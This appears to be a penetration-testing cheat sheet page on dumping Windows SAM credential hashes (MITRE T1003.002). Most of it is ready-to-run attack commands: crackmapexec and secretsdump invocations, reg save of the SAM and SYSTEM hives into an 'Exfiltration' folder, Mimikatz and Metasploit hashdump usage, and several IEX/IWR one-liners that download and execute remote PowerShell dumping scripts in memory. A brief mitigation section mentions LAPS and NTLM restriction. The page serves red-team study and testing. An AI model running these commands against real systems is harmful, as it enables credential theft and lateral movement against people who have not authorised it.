---
description: https://attack.mitre.org/techniques/T1003/002/
---

# Security Account Manager (SAM)

**ATT\&CK ID:** [T1003.002](https://attack.mitre.org/techniques/T1003/002/)

**Permissions Required:** <mark style="color:red;">**SYSTEM**</mark>

**Description**

Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the `net user` command. Enumerating the SAM database requires SYSTEM level access.

## Linux Techniques

### Crackmapexec

```bash
crackmapexec smb <IP> -u <User> -p <Password> --sam

# Use the local-auth parameter when authenticating as a local account
crackmapexec smb <IP> -u <User> -p <Password> --sam --local-auth
```

![](<../../../../.gitbook/assets/image (162) (2).png>)

### Secretsdump

```bash
# Dump from SAM and SYSTEM. Ensure files are in current working directory
secretsdump.py -sam SAM -system SYSTEM LOCAL 
```

<figure><img src="../../../../.gitbook/assets/image (2115).png" alt=""><figcaption></figcaption></figure>

## Windows Techniques

```powershell
# Manually save SAM and SYSTEM files (if needed for any tools below)
reg save HKLM\SAM c:\Exfiltration\SAM
reg save HKLM\SYSTEM c:\Exfiltration\SYSTEM
```

### DumpSam

This tool will filter out some default accounts such as Guest and the wdagutilityaccount account from the results.

Github: [https://github.com/The-Viper-One/PME-Scripts/blob/main/DumpSAM.ps1](https://github.com/The-Viper-One/PME-Scripts/blob/main/DumpSAM.ps1)

```powershell
# Download and execute
IEX (IWR -UseBasicParsing https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/DumpSAM.ps1)
```

### HiveDump

Github: [https://github.com/tmenochet/PowerDump/blob/master/HiveDump.ps1](https://github.com/tmenochet/PowerDump/blob/master/HiveDump.ps1)

```powershell
# Load into memory
iex (iwr -UseBasicParsing https://raw.githubusercontent.com/tmenochet/PowerDump/master/HiveDump.ps1)

# Dump
Invoke-HiveDump
```

### Mimikatz

Github: [https://github.com/BC-SECURITY/Empire/blob/main/empire/test/data/module\_source/credentials/Invoke-Mimikatz.ps1](https://github.com/BC-SECURITY/Empire/blob/main/empire/test/data/module\_source/credentials/Invoke-Mimikatz.ps1)

<pre class="language-powershell"><code class="lang-powershell"><strong># Load into memory
</strong><strong>IEX (IWR -UseBasicParsing "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1")
</strong><strong>
</strong><strong># Dump from SAM and SYSTEM. Enusre files are in current working directory
</strong>Invoke-Mimikatz -command "lsadump::sam /system:SYSTEM /sam:SAM"

# Dump against the live hive files
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
</code></pre>

## Metasploit

```bash
# Modules
use post/windows/gather/hashdump
use post/windows/gather/credentials/credential_collector

# Meterpreter Shell
hashdump

# Extension:Kiwi
lsa_dump_s
```

<figure><img src="../../../../.gitbook/assets/image (2117).png" alt=""><figcaption></figcaption></figure>

## Mitigation



### LAPS

The "Local Administrator Password Solution" (LAPS) provides management of local account passwords of domain joined computers. Passwords are stored in Active Directory (AD) and protected by ACL, so only eligible users can read it or request its reset.

{% embed url="https://www.microsoft.com/en-us/download/details.aspx?id=46899" %}

### Restrict NTLM Traffic

{% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/jj865668(v=ws.10)?redirectedfrom=MSDN" %}
